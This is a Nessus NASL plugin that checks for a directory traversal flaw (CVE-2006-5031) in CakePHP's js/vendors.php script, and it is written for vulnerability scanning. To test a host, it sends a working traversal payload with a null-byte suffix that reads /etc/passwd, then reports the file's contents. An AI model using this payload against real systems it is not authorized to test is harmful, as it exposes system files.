#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22448);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-5031");
  script_bugtraq_id(20150);
  script_xref(name:"OSVDB", value:"29055");

  script_name(english:"CakePHP vendors.php file Variable Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with CakePHP");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CakePHP, an open-source rapid development
framework for PHP. 

The version of CakePHP on the remote host allows directory traversal
sequences in the 'file' parameter of the 'js/vendors.php' script.  An
unauthenticated attacker may be able to leverage this flaw to view
arbitrary files on the remote host subject to the privileges of the
web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00114-09212006" );
 script_set_attribute(attribute:"see_also", value:"https://trac.cakephp.org/ticket/1429" );
 script_set_attribute(attribute:"see_also", value:"http://cakeforge.org/frs/shownotes.php?group_id=23&release_id=134" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CakePHP version 1.1.8.3544 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {

  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../etc/passwd";
  u = string(dir, "/js/vendors.php?", "file=", file, "%00nessus.js" );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}

